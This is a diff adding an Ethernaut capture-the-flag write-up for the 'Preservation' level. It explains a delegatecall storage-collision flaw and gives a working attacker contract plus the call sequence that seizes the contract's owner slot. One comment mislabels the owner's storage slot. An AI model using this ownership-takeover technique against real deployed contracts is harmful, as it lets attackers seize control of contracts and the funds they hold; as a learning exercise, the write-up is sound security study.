@@ -971,3 +971,83 @@ nc.transferFrom(address(this), tx.origin, balance);
 * https://docs.openzeppelin.com/contracts/4.x/erc20
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/IERC20.sol
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/ERC20.sol#L158-L163
+
+## 16 Preservation
+
+To beat this level, we need to comply with
+
+```solidity
+preservation.owner() == _player;
+```
+
+### Solution
+
+Look at the function `setFirstTime()`.
+
+```solidity
+function setFirstTime(uint _timeStamp) public {
+  timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+}
+```
+
+What it does is leveraging the library in the address stored at the variable `timeZone1Library`, and execute the call specified by the variables `setTimeSignature` and `_timeStamp`.
+
+The contract is initialized and `timeZone1Library` points at this contract
+
+```solidity
+// Simple library contract to set the time
+contract LibraryContract {
+
+  // stores a timestamp
+  uint storedTime;
+
+  function setTime(uint _time) public {
+    storedTime = _time;
+  }
+}
+```
+
+And `setTimeSignature` is `bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));`
+
+What it happens then is, that we invoke `setFirstTime`, as `timeZone1Library` is an instance of `LibraryContract`, what it will do is modify the first variable, or slot 0.
+
+To solve this level, when we invoke `setFirstTime`, we will give it an instance of a contract we craft, such that it will call `setTime` and modify the _third_ slot, as opposed to the _first_ one. This is where the `owner` variable is in the original contract.
+
+Our attacking contract can be like this
+
+```solidity
+contract PreservationAttack {
+  bytes32 internal slot0;
+  bytes32 internal slot1;
+  bytes32 internal owner; // slot3
+  address internal challengeAddress; // needed by us
+
+  constructor(address _challengeAddress) {
+    challengeAddress = _challengeAddress;
+  }
+
+  function setTime(uint256 _input) public {
+    owner = bytes32(_input);
+  }
+}
+```
+
+Then the actual attack is
+
+```solidity
+// switch timeZone1Library with our contract
+data = uint256(uint160(address(attackContract)));
+
+(success,) = challengeAddress.call(abi.encodeWithSignature("setFirstTime(uint256)", data));
+success;
+
+// invoke again, this time we'll go through our PreservationAttack contract
+data = uint256(uint160(address(address(this))));
+(success,) = challengeAddress.call(abi.encodeWithSignature("setFirstTime(uint256)", data));
+success;
+```
+
+### References
+
+* https://docs.soliditylang.org/en/v0.8.19/introduction-to-smart-contracts.html#delegatecall-and-libraries
+* https://solidity-by-example.org/delegatecall/
